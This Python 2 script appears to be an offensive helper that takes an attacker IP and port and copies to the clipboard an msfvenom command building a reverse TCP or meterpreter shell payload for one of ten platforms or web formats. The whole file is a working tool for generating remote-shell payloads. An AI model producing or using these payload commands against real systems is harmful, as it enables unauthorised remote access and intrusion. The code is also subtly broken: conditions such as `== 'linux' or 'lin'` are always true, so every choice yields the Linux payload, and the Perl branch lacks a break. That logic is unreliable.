from pynput.keyboard import Key, Controller
import pyperclip

keyboard = Controller()
print("(!) This script allows you to rapidly generate Reverse TCP exploits via msfvenom.")
print("-" * 60)
ipAddress = raw_input("(?) What is your desired IP address? ")
print("-" * 60)
port = raw_input("(?) What is your desired Port? ")
print("-" * 60)

looper = not False

while(True):
	payloadType = raw_input("(?) Linux, Windows, Mac, PHP, ASP, JSP, WAR, Python, Bash, Perl? ")
	payloadTypeNew = payloadType.lower()

	if payloadTypeNew == "linux" or "lin":
		pyperclip.copy("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f elf > payload.elf")
		looper = False
		print("(+) Linux Reverse Shell Generated!")
		break

	elif payloadTypeNew == "windows" or "win":
		pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f exe > payload.exe")
		looper = False
		print("(+) Windows Reverse Shell Generated!")
		break

	elif payloadTypeNew == "mac":
		pyperclip.copy("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f macho > payload.macho")
		looper = False
		print("(+) Mac Reverse Shell Generated!")
		break

	elif payloadTypeNew == "php":
		pyperclip.copy("msfvenom -p php/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.php")
		looper = False
		print("(+) PHP Reverse Shell Generated!")
		break

	elif payloadTypeNew == "asp":
		pyperclip.copy("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f asp > payload.asp")
		looper = False
		print("(+) ASP Reverse Shell Generated!")
		break

	elif payloadTypeNew == "jsp":
		pyperclip.copy("msfvenom -p jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.jsp")
		looper = False
		print("(+) JSP Reverse Shell Generated!")
		break

	elif payloadTypeNew == "war":
		pyperclip.copy("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + ipAddress + " LPORT=" + port + " -f war > payload.war")
		looper = False
		print("(+) WAR Reverse Shell Generated!")
		break

	elif payloadTypeNew == "python" or "py":
		pyperclip.copy("msfvenom -p cmd/unix/reverse_python LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.py")
		looper = False
		print("(+) Python Reverse Shell Generated!")
		break

	elif payloadTypeNew == "bash":
		pyperclip.copy("msfvenom -p cmd/unix/reverse_bash LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.sh")
		looper = False
		print("(+) Bash Reverse Shell Generated!")
		break

	elif payloadTypeNew == "perl" or "per":
		pyperclip.copy("msfvenom -p cmd/unix/reverse_perl LHOST=" + ipAddress + " LPORT=" + port + " -f raw > payload.pl")
		looper = False
		print("(+) Perl Reverse Shell Generated!")

	else:
		print("(-) Unrecognised file type, please try again!")

print("-" * 60)
print("(*) The Requested Script Has Been Copied To Your Clipboard")